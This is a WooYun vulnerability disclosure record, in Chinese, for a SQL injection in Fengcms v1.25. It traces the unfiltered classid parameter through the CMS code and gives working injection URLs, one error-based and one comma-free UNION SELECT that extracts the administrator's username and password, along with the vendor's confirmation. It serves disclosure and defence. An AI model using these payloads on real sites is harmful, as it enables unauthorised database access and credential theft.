{"id": 52233, "wybug_id": "wooyun-2014-071914", "wybug_title": "Fengcms v1.25 SQL注入漏洞", "wybug_corp": "fengcms.com", "wybug_author": "zxx", "wybug_date": "2014-08-12 17:46", "wybug_open_date": "2014-09-26 17:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向公众公开  简要描述： 过滤不严，绕过并注入 详细说明：  Template/article.html和Template/article_class.html中{$classid=$_GET[‘classid’]}//直接GET传入\n<div class=\"home_box\">\t<div class=\"boxtitle\">\t<h3>最新推荐</h3>\t</div>\t<ul class=\"list_12\">\t\t{loop M(\"module\")->l(\"article\",\"w[classid='$classid'&&attrib_j=1&&status=1];f[title,html,date];n[10];s[id,1]\") $k $v} //classid直接带入查询\t\t<li><span>{date('m/d',strtotime($v['date']))}</span><a href=\"{url($v['html'])}\">{$v['title']}</a></li>\t\t{/loop}\t</ul></div>下面的一样，就省略了\n这里显然已经有注入的潜质了，就看后面查询的时候有无过滤，试试直接报错注入http://localhost/?controller=classify&project=article&classify=&classid=1'%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)#\n\nMessage\t：Invalid SQL:select title,html,date from f_article where classid='1' and (select 1 from (select count(*) and (classid = \"concat(version()\") order by id desc limit 10竟然给我变成了 and (classid = \"concat(version()\") 。什么玩意？？不过这里已经看出来数据库表的前缀f_了。继续跟，看看怎么回事。定位model/moduleModel.php中函数l：\npublic function l($table,$func=\"\"){\t$array=explode(\";\",$func);\tif(count($array)>1){\t\tforeach($array as $v){\t\t\t$this->tagsresolve($v);\t\t}\t}else{\t\t$this->tagsresolve($func);\t}。。。。\treturn D($table)->field($field)->where($where)->sort($sortf,$sorts,$sortp)->limit($limit)->getall();\ntagsresolve函数对传过来的参数进行处理了，继续跟tagsresolve函数：\nprivate function tagsresolve($string){\t$str=substr(substr($string,2),0,-1);\tswitch(substr($string,0,1)){\tcase \"w\": //w时\t$exp=explode(',',$str);//这里用逗号分割\tif($exp[1]){//如果我们的语句中有逗号，就会被处理\t\treturn $this->op['where']=$exp[0].$this->whereclass($exp[1]); \t}elseif($str){\t\treturn $this->op['where']=$str;\t}\tbreak;\nwhereclass就不继续跟进了既然把没有逗号了，那就不用好了，见证明   漏洞证明：  http://localhost/?controller=classify&project=article&classify=&classid=2'%20%20UNION%20SELECT%20*%20FROM%20((SELECT%20admin%20from%20f_manage)a%20JOIN%20(SELECT%202)b%20JOIN%20(SELECT%20password%20from%20f_manage)c)%20%23\n\n   修复方案：  把template里面传入的参数也过滤一下   版权声明：转载请注明来源 zxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-13 09:37 厂商回复： 非常感谢，我们立即通知技术人员解决！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}